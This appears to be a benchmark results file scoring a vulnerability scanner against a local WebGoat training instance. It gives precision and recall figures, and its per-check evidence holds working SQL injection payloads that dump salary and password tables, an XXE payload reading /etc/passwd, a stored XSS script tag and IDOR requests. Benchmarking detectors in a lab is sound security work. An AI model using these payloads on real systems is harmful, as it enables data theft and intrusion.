@@ -1,0 +1,385 @@
+{
+  "generated_at": "2026-08-14T12:02:13.854703+00:00",
+  "target": "http://localhost:8081/WebGoat",
+  "runs": 1,
+  "stability": {
+    "scored_timeouts": [],
+    "stable": true
+  },
+  "scorecard": {
+    "summary": {
+      "manifest_positives": 7,
+      "manifest_negative_controls": 4,
+      "findings_total": 7,
+      "findings_real": 7,
+      "findings_simulated_dropped": 0,
+      "true_positives": 7,
+      "validated_true_positives": 7,
+      "unvalidated_matches": 0,
+      "false_negatives": 0,
+      "false_positives": 0,
+      "extras_for_triage": 0,
+      "precision": 1.0,
+      "recall": 1.0,
+      "validated_recall": 1.0,
+      "coverage": 1.0,
+      "evidence_completeness": 1.0,
+      "mock_llm": false
+    },
+    "matched": [
+      {
+        "gt_id": "WG-001",
+        "finding_id": "webgoat-bench-wg-001-20260814120213",
+        "finding_type": "sqli",
+        "endpoint": "http://localhost:8081/WebGoat/SqlInjection/attack8",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "output",
+          "payload",
+          "request",
+          "response",
+          "sqlmap_injection",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-002",
+        "finding_id": "webgoat-bench-wg-002-20260814120213",
+        "finding_type": "sqli",
+        "endpoint": "http://localhost:8081/WebGoat/SqlInjection/attack8",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "output",
+          "payload",
+          "request",
+          "response",
+          "sqlmap_injection",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-003",
+        "finding_id": "webgoat-bench-wg-003-20260814120213",
+        "finding_type": "sqli",
+        "endpoint": "http://localhost:8081/WebGoat/SqlInjectionAdvanced/attack6a",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "output",
+          "payload",
+          "request",
+          "response",
+          "sqlmap_injection",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-004",
+        "finding_id": "webgoat-bench-wg-004-20260814120213",
+        "finding_type": "idor",
+        "endpoint": "http://localhost:8081/WebGoat/IDOR/profile/2342388",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "idor",
+          "output",
+          "payload",
+          "request",
+          "response",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-005",
+        "finding_id": "webgoat-bench-wg-005-20260814120213",
+        "finding_type": "idor",
+        "endpoint": "http://localhost:8081/WebGoat/IDOR/diff-attributes",
+        "confidence": 0.95,
+        "evidence_kinds": [
+          "idor",
+          "note",
+          "payload",
+          "request",
+          "response",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-006",
+        "finding_id": "webgoat-bench-wg-006-20260814120213",
+        "finding_type": "xxe",
+        "endpoint": "http://localhost:8081/WebGoat/xxe/simple",
+        "confidence": 1.0,
+        "evidence_kinds": [
+          "oast_callback",
+          "output",
+          "payload",
+          "request",
+          "response",
+          "status_code",
+          "type"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      },
+      {
+        "gt_id": "WG-007",
+        "finding_id": "webgoat-bench-wg-007-20260814120213",
+        "finding_type": "xssstored",
+        "endpoint": "http://localhost:8081/WebGoat/CrossSiteScriptingStored/stored-xss",
+        "confidence": 0.95,
+        "evidence_kinds": [
+          "marker",
+          "payload",
+          "request",
+          "response",
+          "status_code",
+          "type",
+          "xss_confirmation"
+        ],
+        "evidence_complete": true,
+        "missing_evidence": [],
+        "validation_satisfied": true,
+        "validation_reasons": []
+      }
+    ],
+    "unvalidated_matches": [],
+    "false_negatives": [],
+    "false_positives": [],
+    "extras": [],
+    "notes": [
+      "recall measured over manifest positives (what MUST be found).",
+      "validated_recall counts only matches with validated=true, no manual confirmation requirement, and complete manifest-required evidence.",
+      "precision measured only against explicit negative controls; None means no negative controls were defined.",
+      "extras are findings unmapped to any manifest entry \u2014 triage manually, not counted as false positives.",
+      "simulated/mock findings dropped before scoring."
+    ]
+  },
+  "findings_export": "benchmarks\\results\\owasp-webgoat-core-v1-findings.json",
+  "per_check": {
+    "WG-001": {
+      "name": "WG-001",
+      "type": "SQLi",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.34,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/SqlInjection/attack8",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!\",\n  \"feedbackArgs\" : null,\n  \"output\" : \"<table><tr><th>USERID<\\\\/th><th>FIRST_NAME<\\\\/th><th>LAST_NAME<\\\\/th><th>DEPARTMENT<\\\\/th><th>SALARY<\\\\/th><th>AUTH_TAN<\\\\/th><\\\\/tr><tr><td>32147<\\\\/td><td>Paulina<\\\\/td><td>Travers<\\\\/td><td>Accounting<\\\\/td><td>46000<\\\\/td><td>P45JSI<\\\\/td><\\\\/tr><tr><td>34477<\\\\/td><td>Abraham <\\\\/td><td>Holman<\\\\/td><td>Development<\\\\/td><td>50000<\\\\/td><td>UU2ALK<\\\\",
+        "status_code": 200,
+        "type": "sqlmap_injection",
+        "payload": "Smith' UNION SELECT userid,first_name,last_name,department,salary,auth_tan FROM employees WHERE '1'='1' --",
+        "output": "<table><tr><th>USERID<\\/th><th>FIRST_NAME<\\/th><th>LAST_NAME<\\/th><th>DEPARTMENT<\\/th><th>SALARY<\\/th><th>AUTH_TAN<\\/th><\\/tr><tr><td>32147<\\/td><td>Paulina<\\/td><td>Travers<\\/td><td>Accounting<\\/td><td>46000<\\/td><td>P45JSI<\\/td><\\/tr><tr><td>34477<\\/td><td>Abraham <\\/td><td>Holman<\\/td><td>Development<\\/td><td>50000<\\/td><td>UU2ALK<\\/td><\\/tr><tr><td>37648<\\/td><td>John<\\/td><td>Smith<\\/td><td>Marketing<\\/td><td>64350<\\/td><td>3SL99A<\\/td><\\/tr><tr><td>89762<\\/td><td>Tobi<\\/td><td>Barnett<\\/td><td>Development<\\/td><td>77000<\\/td><td>TA9LL1<\\/td><\\/tr><tr><td>96134<\\/td><td>Bob<\\/td><td>Franc"
+      },
+      "error": null
+    },
+    "WG-002": {
+      "name": "WG-002",
+      "type": "SQLi",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.1,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/SqlInjection/attack8",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!\",\n  \"feedbackArgs\" : null,\n  \"output\" : \"<table><tr><th>USERID<\\\\/th><th>FIRST_NAME<\\\\/th><th>LAST_NAME<\\\\/th><th>DEPARTMENT<\\\\/th><th>SALARY<\\\\/th><th>AUTH_TAN<\\\\/th><\\\\/tr><tr><td>32147<\\\\/td><td>Paulina<\\\\/td><td>Travers<\\\\/td><td>Accounting<\\\\/td><td>46000<\\\\/td><td>P45JSI<\\\\/td><\\\\/tr><tr><td>34477<\\\\/td><td>Abraham <\\\\/td><td>Holman<\\\\/td><td>Development<\\\\/td><td>50000<\\\\/td><td>UU2ALK<\\\\",
+        "status_code": 200,
+        "type": "sqlmap_injection",
+        "payload": "Smith' OR '1'='1' --",
+        "output": "<table><tr><th>USERID<\\/th><th>FIRST_NAME<\\/th><th>LAST_NAME<\\/th><th>DEPARTMENT<\\/th><th>SALARY<\\/th><th>AUTH_TAN<\\/th><\\/tr><tr><td>32147<\\/td><td>Paulina<\\/td><td>Travers<\\/td><td>Accounting<\\/td><td>46000<\\/td><td>P45JSI<\\/td><\\/tr><tr><td>34477<\\/td><td>Abraham <\\/td><td>Holman<\\/td><td>Development<\\/td><td>50000<\\/td><td>UU2ALK<\\/td><\\/tr><tr><td>37648<\\/td><td>John<\\/td><td>Smith<\\/td><td>Marketing<\\/td><td>64350<\\/td><td>3SL99A<\\/td><\\/tr><tr><td>89762<\\/td><td>Tobi<\\/td><td>Barnett<\\/td><td>Development<\\/td><td>77000<\\/td><td>TA9LL1<\\/td><\\/tr><tr><td>96134<\\/td><td>Bob<\\/td><td>Franc"
+      },
+      "error": null
+    },
+    "WG-003": {
+      "name": "WG-003",
+      "type": "SQLi",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.07,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/SqlInjectionAdvanced/attack6a",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"You have succeeded: <p>USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT, <br \\\\/>101, jsnow, passwd1, , jsnow, passwd1, 101, <br \\\\/>102, jdoe, passwd2, , jdoe, passwd2, 102, <br \\\\/>103, jplane, passwd3, , jplane, passwd3, 103, <br \\\\/>104, jeff, jeff, , jeff, jeff, 104, <br \\\\/>105, dave, passW0rD, , dave, passW0rD, 105, <br \\\\/><\\\\/p>Well done! Can you also figure out a solution, by appending a new SQL Statement?\",\n  \"feedbackArgs\" : null,\n  \"output\" : \" Your query was: SELECT * FROM user_data WHERE last_name = '' UNION SEL",
+        "status_code": 200,
+        "type": "sqlmap_injection",
+        "payload": "' UNION SELECT userid,user_name,password,cookie,user_name,password,userid FROM user_system_data--",
+        "output": " Your query was: SELECT * FROM user_data WHERE last_name = '' UNION SELECT userid,user_name,password,cookie,user_name,password,userid FROM user_system_data--'"
+      },
+      "error": null
+    },
+    "WG-004": {
+      "name": "WG-004",
+      "type": "IDOR",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.13,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/IDOR/profile/2342388",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"Well done, you found someone else's profile\",\n  \"feedbackArgs\" : null,\n  \"output\" : \"{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}\",\n  \"outputArgs\" : null,\n  \"assignment\" : \"IDORViewOtherProfile\",\n  \"attemptWasMade\" : true\n}",
+        "status_code": 200,
+        "type": "idor",
+        "payload": "/IDOR/profile/2342388",
+        "output": "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}"
+      },
+      "error": null
+    },
+    "WG-005": {
+      "name": "WG-005",
+      "type": "IDOR",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 0.95,
+      "seconds": 0.08,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/IDOR/diff-attributes",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"Correct, the two attributes not displayed are userId & role. Keep those in mind\",\n  \"feedbackArgs\" : null,\n  \"output\" : null,\n  \"outputArgs\" : null,\n  \"assignment\" : \"IDORDiffAttributes\",\n  \"attemptWasMade\" : true\n}",
+        "status_code": 200,
+        "type": "idor",
+        "payload": {
+          "attributes": "role,userID"
+        },
+        "note": "sensitive object attributes readable via attribute-differential"
+      },
+      "error": null
+    },
+    "WG-006": {
+      "name": "WG-006",
+      "type": "XXE",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 1.0,
+      "seconds": 0.35,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/xxe/simple",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"Congratulations. You have successfully completed the assignment.\",\n  \"feedbackArgs\" : null,\n  \"output\" : null,\n  \"outputArgs\" : null,\n  \"assignment\" : \"SimpleXXE\",\n  \"attemptWasMade\" : true\n}",
+        "status_code": 200,
+        "type": "oast_callback",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><comment><text>&xxe;</text></comment>",
+        "output": ""
+      },
+      "error": null
+    },
+    "WG-007": {
+      "name": "WG-007",
+      "type": "XSSStored",
+      "expected_exploitable": true,
+      "validated": true,
+      "status": "VALIDATED",
+      "confidence": 0.95,
+      "seconds": 0.03,
+      "evidence": {
+        "request": "http://localhost:8081/WebGoat/CrossSiteScriptingStored/stored-xss",
+        "response": "{\n  \"lessonCompleted\" : true,\n  \"feedback\" : \"It appears your payload should invoke the function. To tell for sure, you need to capture the value and put it in the form below. Then we will really know.\",\n  \"feedbackArgs\" : null,\n  \"output\" : null,\n  \"outputArgs\" : null,\n  \"assignment\" : \"StoredXssComments\",\n  \"attemptWasMade\" : true\n}",
+        "status_code": 200,
+        "type": "xss_confirmation",
+        "payload": "<script>webgoat.customjs.phoneHome()</script>",
+        "marker": "webgoat.customjs.phoneHome"
+      },
+      "error": null
+    },
+    "WG-NEG-001": {
+      "name": "WG-NEG-001",
+      "type": "SQLi",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.03,
+      "evidence": {
+        "note": "valid non-injecting login \u2014 an SQLi detector firing here is matching the endpoint, not the injection",
+        "payload": {
+          "name": "Smith",
+          "auth_tan": "WRONG9"
+        },
+        "status_code": 200,
+        "request": "http://localhost:8081/WebGoat/SqlInjection/attack8"
+      },
+      "error": null
+    },
+    "WG-NEG-002": {
+      "name": "WG-NEG-002",
+      "type": "XXE",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.05,
+      "evidence": {
+        "note": "JSON body \u2014 the XXE lesson only parses XML; firing on non-XML input is a content-type hallucination",
+        "payload": {
+          "text": "hello"
+        },
+        "status_code": 200,
+        "request": "http://localhost:8081/WebGoat/xxe/simple"
+      },
+      "error": null
+    },
+    "WG-NEG-003": {
+      "name": "WG-NEG-003",
+      "type": "XSSStored",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.04,
+      "evidence": {
+        "note": "benign comment \u2014 needs the phoneHome() marker to prove script execution (negative control)",
+        "payload": {
+          "text": "This comment is safe"
+        },
+        "status_code": 200,
+        "request": "http://localhost:8081/WebGoat/CrossSiteScriptingStored/stored-xss"
+      },
+      "error": null
+    },
+    "WG-NEG-004": {
+      "name": "WG-NEG-004",
+      "type": "IDOR",
+      "expected_exploitable": false,
+      "validated": false,
+      "status": "NOT_FOUND",
+      "confidence": 0.0,
+      "seconds": 0.07,
+      "evidence": {
+        "note": "own profile \u2014 IDOR needs a cross-user differential; the lesson does not complete on self-access",
+        "output": "",
+        "status_code": 200,
+        "request": "http://localhost:8081/WebGoat/IDOR/profile/2342384"
+      },
+      "error": null
+    }
+  }
+}
